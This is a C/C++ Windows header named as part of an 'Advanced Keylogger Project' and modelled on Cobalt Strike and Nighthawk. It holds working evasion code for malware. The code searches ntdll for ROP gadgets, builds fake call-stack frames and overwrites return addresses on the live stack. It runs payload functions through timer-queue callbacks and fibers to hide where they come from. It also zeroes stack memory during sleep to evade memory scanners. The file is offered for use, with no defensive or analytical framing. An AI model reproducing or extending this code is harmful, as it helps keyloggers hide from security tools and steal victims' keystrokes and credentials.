/*
 * Stack Spoofing Header
 * Thread stack manipulation for evasion
 * 
 * Features:
 * - Call stack spoofing (fake return addresses)
 * - Stack concealment during sleep
 * - ROP-based execution
 * - Return address masking
 * 
 * Inspired by Cobalt Strike, Nighthawk techniques
 * 
 * Advanced Keylogger Project - Elite Upgrade
 */

#ifndef STACKSPOOF_H
#define STACKSPOOF_H

#include <windows.h>
#include <dbghelp.h>

#pragma comment(lib, "dbghelp.lib")

// ==================== STRUCTURES ====================

// Synthetic frame for stack spoofing
typedef struct _SYNTH_FRAME {
    PVOID ReturnAddress;
    PVOID FramePointer;
    DWORD64 StackSize;
} SYNTH_FRAME, *PSYNTH_FRAME;

// Stored original context for restoration
typedef struct _SPOOF_CONTEXT {
    CONTEXT OriginalContext;
    PVOID OriginalRsp;
    PVOID OriginalRip;
    BOOL IsActive;
} SPOOF_CONTEXT, *PSPOOF_CONTEXT;

static SPOOF_CONTEXT g_SpoofContext = { 0 };

// ==================== GADGET FINDING ====================
/*
 * Find ROP gadgets in a module for stack pivoting
 * Common gadgets needed:
 * - ret (C3)
 * - pop rxx; ret
 * - add rsp, xx; ret
 */

// Find 'ret' instruction in module
inline PVOID FindRetGadget(PVOID pModuleBase) {
    if (!pModuleBase) return NULL;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    // Search in .text section
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_CNT_CODE) {
            BYTE* pCode = (BYTE*)pModuleBase + pSection[i].VirtualAddress;
            DWORD size = pSection[i].Misc.VirtualSize;
            
            for (DWORD j = 0; j < size; j++) {
                if (pCode[j] == 0xC3) {  // ret
                    return &pCode[j];
                }
            }
            break;
        }
    }
    
    return NULL;
}

// Find 'jmp rax' gadget
inline PVOID FindJmpRaxGadget(PVOID pModuleBase) {
    if (!pModuleBase) return NULL;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_CNT_CODE) {
            BYTE* pCode = (BYTE*)pModuleBase + pSection[i].VirtualAddress;
            DWORD size = pSection[i].Misc.VirtualSize;
            
            for (DWORD j = 0; j < size - 1; j++) {
                // jmp rax = FF E0
                if (pCode[j] == 0xFF && pCode[j+1] == 0xE0) {
                    return &pCode[j];
                }
            }
            break;
        }
    }
    
    return NULL;
}

// ==================== STACK FRAME BUILDER ====================
/*
 * Builds a fake call stack that looks like:
 * kernel32!BaseThreadInitThunk
 *   -> ntdll!RtlUserThreadStart
 *     -> kernel32!SomeFunction
 *       -> our_code
 */

inline BOOL BuildFakeStack(SYNTH_FRAME* pFrames, DWORD frameCount) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    if (!hKernel32 || !hNtdll) return FALSE;
    
    // Get some legitimate function addresses
    PVOID pBaseThread = GetProcAddress(hKernel32, "BaseThreadInitThunk");
    PVOID pRtlUserThread = GetProcAddress(hNtdll, "RtlUserThreadStart");
    PVOID pSleep = GetProcAddress(hKernel32, "Sleep");
    
    if (frameCount >= 1 && pRtlUserThread) {
        pFrames[0].ReturnAddress = (BYTE*)pRtlUserThread + 0x21; // Offset into function
        pFrames[0].FramePointer = NULL;
        pFrames[0].StackSize = 0x28;
    }
    
    if (frameCount >= 2 && pBaseThread) {
        pFrames[1].ReturnAddress = (BYTE*)pBaseThread + 0x14;
        pFrames[1].FramePointer = NULL;
        pFrames[1].StackSize = 0x28;
    }
    
    if (frameCount >= 3 && pSleep) {
        pFrames[2].ReturnAddress = (BYTE*)pSleep + 0x10;
        pFrames[2].FramePointer = NULL;
        pFrames[2].StackSize = 0x28;
    }
    
    return TRUE;
}

// ==================== CONTEXT MANIPULATION ====================

#ifdef _WIN64

// Capture current context
inline VOID CaptureContext(PCONTEXT pContext) {
    RtlCaptureContext(pContext);
}

// Spoof the call stack before calling a function
inline BOOL SpoofCallStack() {
    if (g_SpoofContext.IsActive) return FALSE;
    
    CONTEXT ctx;
    RtlCaptureContext(&ctx);
    
    // Save original
    g_SpoofContext.OriginalContext = ctx;
    g_SpoofContext.OriginalRsp = (PVOID)ctx.Rsp;
    g_SpoofContext.OriginalRip = (PVOID)ctx.Rip;
    g_SpoofContext.IsActive = TRUE;
    
    return TRUE;
}

// Restore original stack
inline VOID RestoreCallStack() {
    if (!g_SpoofContext.IsActive) return;
    g_SpoofContext.IsActive = FALSE;
}

#else

inline VOID CaptureContext(PCONTEXT pContext) {
    pContext->ContextFlags = CONTEXT_FULL;
    __asm {
        mov eax, pContext
        mov [eax]CONTEXT.Eax, eax
        mov [eax]CONTEXT.Ecx, ecx
        mov [eax]CONTEXT.Edx, edx
        mov [eax]CONTEXT.Ebx, ebx
        mov [eax]CONTEXT.Esi, esi
        mov [eax]CONTEXT.Edi, edi
        mov [eax]CONTEXT.Ebp, ebp
        mov [eax]CONTEXT.Esp, esp
    }
}

inline BOOL SpoofCallStack() {
    return FALSE;  // x86 implementation would be different
}

inline VOID RestoreCallStack() {
    // x86 stub
}

#endif

// ==================== RETURN ADDRESS MASKING ====================
/*
 * Replace return addresses on stack temporarily
 * to hide our true call chain during API calls
 */

typedef struct _RET_MASK_ENTRY {
    PVOID* pRetAddr;
    PVOID OriginalValue;
    PVOID MaskedValue;
} RET_MASK_ENTRY;

#define MAX_MASKED_RETURNS 16
static RET_MASK_ENTRY g_MaskedReturns[MAX_MASKED_RETURNS] = { 0 };
static int g_MaskCount = 0;

inline BOOL MaskReturnAddresses() {
    g_MaskCount = 0;
    
    // Get gadgets for masking
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID pRetGadget = FindRetGadget(hNtdll);
    
    if (!pRetGadget) return FALSE;
    
    // Walk stack and mask returns
    CONTEXT ctx;
    RtlCaptureContext(&ctx);
    
#ifdef _WIN64
    PVOID* pStack = (PVOID*)ctx.Rsp;
    
    // Check first few stack entries for code pointers
    for (int i = 0; i < 32 && g_MaskCount < MAX_MASKED_RETURNS; i++) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(pStack[i], &mbi, sizeof(mbi))) {
            if (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | 
                               PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) {
                // This looks like a return address
                g_MaskedReturns[g_MaskCount].pRetAddr = &pStack[i];
                g_MaskedReturns[g_MaskCount].OriginalValue = pStack[i];
                g_MaskedReturns[g_MaskCount].MaskedValue = pRetGadget;
                
                // Mask it
                pStack[i] = pRetGadget;
                g_MaskCount++;
            }
        }
    }
#endif
    
    return TRUE;
}

inline VOID UnmaskReturnAddresses() {
    for (int i = 0; i < g_MaskCount; i++) {
        if (g_MaskedReturns[i].pRetAddr) {
            *g_MaskedReturns[i].pRetAddr = g_MaskedReturns[i].OriginalValue;
        }
    }
    g_MaskCount = 0;
}

// ==================== TIMER-BASED EXECUTION ====================
/*
 * Execute code via timer callback to hide call stack
 * The callback appears to originate from ntdll timer code
 */

typedef struct _TIMER_PAYLOAD {
    PVOID pFunction;
    PVOID pArg;
    HANDLE hEvent;
} TIMER_PAYLOAD, *PTIMER_PAYLOAD;

static VOID CALLBACK TimerCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired) {
    PTIMER_PAYLOAD payload = (PTIMER_PAYLOAD)lpParameter;
    
    if (payload && payload->pFunction) {
        typedef VOID(*PayloadFunc)(PVOID);
        PayloadFunc fn = (PayloadFunc)payload->pFunction;
        fn(payload->pArg);
        
        if (payload->hEvent) {
            SetEvent(payload->hEvent);
        }
    }
}

inline BOOL ExecuteViaTimer(PVOID pFunction, PVOID pArg, DWORD dwTimeout = 5000) {
    TIMER_PAYLOAD payload;
    payload.pFunction = pFunction;
    payload.pArg = pArg;
    payload.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    
    if (!payload.hEvent) return FALSE;
    
    HANDLE hTimer = NULL;
    HANDLE hTimerQueue = CreateTimerQueue();
    
    if (!hTimerQueue) {
        CloseHandle(payload.hEvent);
        return FALSE;
    }
    
    // Create timer that fires immediately
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, TimerCallback, 
        &payload, 0, 0, WT_EXECUTEDEFAULT)) {
        DeleteTimerQueue(hTimerQueue);
        CloseHandle(payload.hEvent);
        return FALSE;
    }
    
    // Wait for execution
    WaitForSingleObject(payload.hEvent, dwTimeout);
    
    // Cleanup
    DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    DeleteTimerQueue(hTimerQueue);
    CloseHandle(payload.hEvent);
    
    return TRUE;
}

// ==================== SLEEP WITH STACK CLEANUP ====================
/*
 * During sleep, clean the stack to hide our presence
 * from memory scanners
 */

inline VOID SleepWithCleanStack(DWORD dwMilliseconds) {
    // Save critical context
    CONTEXT ctx;
    RtlCaptureContext(&ctx);
    
#ifdef _WIN64
    // Get stack bounds
    NT_TIB* pTib = (NT_TIB*)NtCurrentTeb();
    PVOID pStackBase = pTib->StackBase;
    PVOID pStackLimit = pTib->StackLimit;
    
    // Calculate our stack usage
    SIZE_T stackUsed = (SIZE_T)pStackBase - ctx.Rsp;
    SIZE_T safeArea = 4096; // Keep some frames
    
    // Zero out old stack frames (carefully)
    if (stackUsed > safeArea) {
        SIZE_T toZero = stackUsed - safeArea;
        PVOID pZeroStart = (PVOID)(ctx.Rsp + safeArea);
        
        // Only zero if we have permissions
        DWORD oldProtect;
        if (VirtualProtect(pZeroStart, toZero, PAGE_READWRITE, &oldProtect)) {
            SecureZeroMemory(pZeroStart, toZero);
            VirtualProtect(pZeroStart, toZero, oldProtect, &oldProtect);
        }
    }
#endif
    
    // Now sleep
    Sleep(dwMilliseconds);
}

// ==================== FIBER-BASED EXECUTION ====================
/*
 * Use fibers to obscure execution flow
 * Fibers have their own stack, separate from main thread
 */

typedef struct _FIBER_CONTEXT {
    PVOID pFunction;
    PVOID pArg;
    PVOID pOriginalFiber;
    PVOID pResult;
    BOOL bComplete;
} FIBER_CONTEXT, *PFIBER_CONTEXT;

static FIBER_CONTEXT g_FiberCtx = { 0 };

static VOID WINAPI FiberProc(PVOID lpParameter) {
    PFIBER_CONTEXT pCtx = (PFIBER_CONTEXT)lpParameter;
    
    if (pCtx && pCtx->pFunction) {
        typedef PVOID(*PayloadFunc)(PVOID);
        PayloadFunc fn = (PayloadFunc)pCtx->pFunction;
        pCtx->pResult = fn(pCtx->pArg);
        pCtx->bComplete = TRUE;
    }
    
    // Switch back to original fiber
    if (pCtx && pCtx->pOriginalFiber) {
        SwitchToFiber(pCtx->pOriginalFiber);
    }
}

inline PVOID ExecuteViaFiber(PVOID pFunction, PVOID pArg) {
    // Convert thread to fiber if needed
    PVOID pMainFiber = ConvertThreadToFiber(NULL);
    if (!pMainFiber) {
        pMainFiber = GetCurrentFiber();
        if (!pMainFiber) return NULL;
    }
    
    // Setup context
    g_FiberCtx.pFunction = pFunction;
    g_FiberCtx.pArg = pArg;
    g_FiberCtx.pOriginalFiber = pMainFiber;
    g_FiberCtx.pResult = NULL;
    g_FiberCtx.bComplete = FALSE;
    
    // Create new fiber
    PVOID pNewFiber = CreateFiber(0, FiberProc, &g_FiberCtx);
    if (!pNewFiber) return NULL;
    
    // Execute
    SwitchToFiber(pNewFiber);
    
    // Cleanup
    DeleteFiber(pNewFiber);
    ConvertFiberToThread();  // Optional: convert back
    
    return g_FiberCtx.pResult;
}

#endif // STACKSPOOF_H
